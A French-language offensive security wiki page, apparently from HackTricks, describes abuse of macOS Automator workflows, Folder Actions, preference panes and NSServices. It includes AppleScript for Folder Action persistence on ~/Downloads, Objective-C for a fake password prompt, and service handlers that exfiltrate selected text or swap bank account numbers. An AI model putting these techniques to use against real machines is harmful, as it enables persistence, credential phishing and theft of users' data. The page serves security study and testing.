# Abus de macOS Automator, Preference Panes & NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Informations de base

**Automator** est l'outil d'automatisation visuelle de macOS. Il exécute des **workflows** (`.workflow` bundles) composés d'**actions** (`.action` bundles). Automator alimente aussi les **Folder Actions**, **Quick Actions**, et l'intégration des **Shortcuts**.

Les Automator actions sont des **plugins** chargés dans le runtime d'Automator lorsque un workflow s'exécute. Ils peuvent :
- Exécuter des shell scripts arbitraires
- Traiter des fichiers et des données
- Interagir avec des applications via AppleScript
- S'enchaîner pour des automatisations complexes

### Pourquoi c'est important

> [!WARNING]
> Les workflows Automator peuvent être amenés à s'exécuter par ingénierie sociale — ils apparaissent comme de simples fichiers document. Un bundle `.workflow` peut contenir des commandes shell intégrées qui s'exécutent lorsque le workflow s'exécute. Combinés avec les Folder Actions, ils fournissent une persistance automatique qui se déclenche sur des événements de fichier.

### Découverte
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Un bundle `.workflow` ressemble à un fichier document normal pour la plupart des utilisateurs :
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions exécutent automatiquement un workflow lorsque des fichiers sont ajoutés à un dossier surveillé :
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persistent après les redémarrages et s'exécutent silencieusement. Une Folder Action sur `~/Downloads` signifie que **chaque fichier téléchargé déclenche votre payload** — y compris les fichiers provenant de Safari, Chrome, AirDrop et les pièces jointes email.

---

## Panneaux de préférences

### Informations de base

Preference panes (`.prefPane` bundles) sont des plugins chargés dans **System Settings** (anciennement System Preferences). Ils fournissent des panneaux d'interface de configuration pour des fonctionnalités système ou tierces.

### Pourquoi c'est important

- Les panneaux de préférences s'exécutent dans le **processus System Settings**, qui peut disposer de **permissions TCC élevées** (accessibility, full disk access dans certains contextes)
- Les panneaux de préférences tiers sont chargés dans ce processus de confiance, **héritant de son contexte de sécurité**
- Les utilisateurs installent les panneaux de préférences en les **double-cliquant** — vecteur d'ingénierie sociale facile
- Une fois installés, ils **persistent** et se chargent à chaque ouverture de System Settings sur ce panneau

### Découverte
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attaque : Privilege Context Hijacking

Un panneau de préférences malveillant hérite du contexte de sécurité de System Settings :
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attaque : Persistance via l'installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attaque : UI Phishing

Un panneau de préférences peut imiter des panneaux d'interface système légitimes pour **phish for credentials** :
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** allow applications to provide functionality to other apps through the **Services menu** (right-click → Services). When a user selects text or data and invokes a service, the selected data is **sent to the service provider** for processing.

Services are declared in an application's `Info.plist` under the `NSServices` key and registered with the pasteboard server (`pbs`).

### Why This Matters

- Services receive **cross-application data flow** — selected text from any application is sent to the service
- A malicious service captures data from password managers, email clients, financial apps
- Services can **return modified data** to the calling application (man-in-the-middle on selection operations)
- Service names can be crafted to appear legitimate ("Format Text", "Encrypt Selection", "Share")

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attaque : Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attaque : Modification de données (Man-in-the-Middle)

Un service peut **modifier les données renvoyées** tout en semblant fournir une fonction légitime :
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Chaînes d'attaque multi-techniques

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Panneau de préférences → Escalade TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Password Manager Theft
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Références

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
